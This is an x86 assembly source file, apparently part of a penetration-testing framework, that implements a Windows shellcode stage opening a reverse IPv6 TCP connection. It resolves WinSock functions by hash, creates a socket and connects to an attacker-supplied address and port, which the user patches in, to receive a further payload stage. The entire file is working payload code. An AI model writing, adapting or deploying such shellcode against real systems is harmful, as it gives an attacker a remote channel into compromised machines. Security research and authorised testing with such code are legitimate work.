;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4 - Assuming IPv6 is available
; Version: 1.0 (8 May 2011)
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x20C)

reverse_ipv6_tcp:

  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0204        ; EAX > sizeof( struct WSAData )
  sub esp, eax           ; alloc enough space for the WSAData structure
  dec eax                ; preserve stack alignment!
  dec eax                ;
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0202, &WSAData );
  
  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
  push eax               ; push null for reserved parameter
  push eax               ; we do not specify a WSAPROTOCOL_INFO structure
  push byte 6            ; push IPPROTO_TCP
  inc eax                ; Increment EAX do it is 1
  push eax               ; push SOCK_STREAM
  push byte 23           ; push AF_INET6
  push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
  call ebp               ; WSASocketA( AF_INET6, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0 );
  mov edi, eax           ; save the socket for later
  
  push byte 28           ; length of the sockaddr_in6 struct
  call ipv6_connect      ; call over the sockaddr_in6 structure ...pushing its address as a parameter for upcoming connect() call
                         ; (http://msdn.microsoft.com/en-us/library/ms738664%28VS.85%29.aspx)
  dw 0x0017              ; sin6_family == AF_INET6
  dw 0x5C11              ; sin6_port (Patched by user)
  dd 0x00000000          ; sin6_flowinfo
  dq 0xBBBBBBBBBBBBBBB1  ; sin6_addr (Patched by user)
  dq 0xCCCCCCCCCCCCCCC1  ; ...
  dd 0xAAAAAAA1          ; sin6_scope_id (Patched by user)
ipv6_connect:            ;
  push edi               ; the socket
  push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
  call ebp               ; connect( s, &sockaddr_in6, 28 );
  
  mov esi, esp           ; set ESI to ESP for block_recv compatability
  